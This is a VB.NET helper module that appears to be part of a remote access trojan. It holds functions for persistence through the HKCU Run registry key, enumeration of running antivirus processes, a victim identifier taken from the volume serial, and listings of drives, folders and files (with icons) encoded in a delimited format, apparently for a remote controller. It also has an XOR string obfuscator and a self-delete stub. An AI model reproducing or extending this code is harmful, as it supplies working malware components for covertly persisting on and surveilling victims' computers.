Imports System.IO
Imports System.Runtime.InteropServices

Module Func
    <DllImport("shell32.dll")> _
    Private Function SHGetFileInfo(pszPath As String, dwFileAttributes As UInteger, ByRef psfi As SHFILEINFO, cbSizeFileInfo As UInteger, uFlags As UInteger) As IntPtr
    End Function

    Structure SHFILEINFO
        Public hIcon As IntPtr
        Public iIcon As Integer
        Public dwAttributes As Integer
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=260)> _
        Public szDisplayName As String
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=80)> _
        Public szTypeName As String
    End Structure

    Const SHGFI_ICON As UInteger = &H100
    Const SHGFI_LARGEICON As UInteger = &H0 ' 32x32 pixels
    Const SHGFI_SMALLICON As UInteger = &H1 ' 16x16 pixels

    Public Sub SelfDel() ''Delete Lavender

    End Sub

    Public Function Xord(ByVal str As String, ByVal key As String) ''Is not being used right now remove if never needed todo!
        Dim i As Short
        Xord = ""
        Dim KeyChar As Integer
        KeyChar = Asc(key)
        For i = 1 To Len(str)
            Xord &= _
               Chr(KeyChar Xor _
               Asc(Mid(str, i, 1)))
        Next
    End Function

    Public Sub AddS(ByVal b As Boolean, ByVal sk As String)
        Try
            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
            regKey.SetValue(sk, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
        Catch : End Try
    End Sub
    ''==========================================================================
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public GetProcesses() As Process

    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function

    Function getanti()
        Dim antivirus As String
        Dim total As String = "Not Found"
        'get name anti-virus vb.net function
        Dim procList() As Process = Process.GetProcesses()

        Dim i As Integer
        For i = 0 To procList.Length - 1 Step i + 1
            Dim strProcName As String = procList(i).ProcessName.ToLower
            If strProcName = "ekrn" Then
                antivirus = "NOD32"
            ElseIf strProcName = "avgcc" Then
                antivirus = "AVG"
            ElseIf strProcName = "avgnt" Then
                antivirus = "Avira"
            ElseIf strProcName = "ahnsd" Then
                antivirus = "AhnLab-V3"
            ElseIf strProcName = "bdss" Then
                antivirus = "BitDefender"
            ElseIf strProcName = "bdv" Then
                antivirus = "ByteHero"
            ElseIf strProcName = "clamav" Then
                antivirus = "ClamAV"
            ElseIf strProcName = "fpavserver" Then
                antivirus = "F-Prot"
            ElseIf strProcName = "fssm32" Then
                antivirus = "F-Secure"
            ElseIf strProcName = "avkcl" Then
                antivirus = "GData"
            ElseIf strProcName = "engface" Then
                antivirus = "Jiangmin"
            ElseIf strProcName = "avp" Then
                antivirus = "Kaspersky"
            ElseIf strProcName = "updaterui" Then
                antivirus = "McAfee"
            ElseIf strProcName = "msmpeng" Then
                antivirus = "MSE/Defender"
            ElseIf strProcName = "zanda" Then
                antivirus = "Norman"
            ElseIf strProcName = "npupdate" Then
                antivirus = "nProtect"
            ElseIf strProcName = "inicio" Then
                antivirus = "Panda"
            ElseIf strProcName = "sagui" Then
                antivirus = "Prevx"
            ElseIf strProcName = "Norman" Then
                antivirus = "Sophos"
            ElseIf strProcName = "savservice" Then
                antivirus = "Sophos"
            ElseIf strProcName = "saswinlo" Then
                antivirus = "SUPERAntiSpyware"
            ElseIf strProcName = "spbbcsvc" Then
                antivirus = "Symantec"
            ElseIf strProcName = "thd32" Then
                antivirus = "TheHacker"
            ElseIf strProcName = "ufseagnt" Then
                antivirus = "TrendMicro"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "sbamtray" Then
                antivirus = "VIPRE"
            ElseIf strProcName = "vrmonsvc" Then
                antivirus = "ViRobot"
            ElseIf strProcName = "vbcalrt" Then
                antivirus = "VirusBuster"
            ElseIf strProcName = "mbam" Then
                antivirus = "Malwarebytes Anti-Malware GUI"
            ElseIf strProcName = "mbamresearch" Then
                antivirus = "Malwarebytes Anti-Malware"
            ElseIf strProcName = "mbamservice" Then
                antivirus = "Malwarebytes Anti-Malware Service"
            Else
                antivirus = "NA"
            End If

            If Not antivirus = "NA" Then
                If total = "Not Found" Then
                    total = ""
                Else
                    total += ", "
                End If
                total += antivirus
            End If
            Dim iProcID As Integer = procList(i).Id ''PID antivi proc
        Next

        Return total
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "^||^^||^x^||^"
                Case 5
                    allDrives += "[CD]" & d.Name & "^||^^||^x^||^"
                Case 2
                    allDrives += "[Rem]" & d.Name & "^||^^||^x^||^"
            End Select
        Next
        Return allDrives
    End Function
    Public Function readtext(ByVal l As String) As String
        Return IO.File.ReadAllText(l)
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "^||^^||^x^||^"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "^||^" & f.Length.ToString & "^||^"
            Try
                files += Convert.ToBase64String(IconToBytes(Icon.ExtractAssociatedIcon(f.FullName))) & "^||^"
                ''files += Convert.ToBase64String(IconToBytes(IconTools.GetIconForExtension(Path.GetExtension(f.FullName), ShellIconSize.LargeIcon))) & "^||^"
            Catch ex As Exception
                files += "x^||^"
            End Try
        Next
        Return files
    End Function
    Public Function getlog(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.log*")
            files += f.Name & "|"
        Next
        Return files
    End Function

    Function IconToBytes(icon As Icon) As Byte()
        Using ms As New MemoryStream()
            icon.ToBitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png)
            Return ms.ToArray()
        End Using
    End Function

    Private is64BitProcess As Boolean = (IntPtr.Size = 8)
    Public is64BitOperatingSystem As Boolean = is64BitProcess OrElse InternalCheckIsWow64()

    <DllImport("Kernel32.dll", SetLastError:=True, CallingConvention:=CallingConvention.Winapi)>
    Public Function IsWow64Process(
    ByVal hProcess As IntPtr,
    ByRef wow64Process As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean

    End Function

    Public Function InternalCheckIsWow64() As Boolean
        If (Environment.OSVersion.Version.Major = 5 AndAlso Environment.OSVersion.Version.Minor >= 1) OrElse Environment.OSVersion.Version.Major >= 6 Then
            Using p As Process = Process.GetCurrentProcess()
                Dim retVal As Boolean
                If Not IsWow64Process(p.Handle, retVal) Then
                    Return False
                End If
                Return retVal
            End Using
        Else
            Return False
        End If
    End Function
End Module
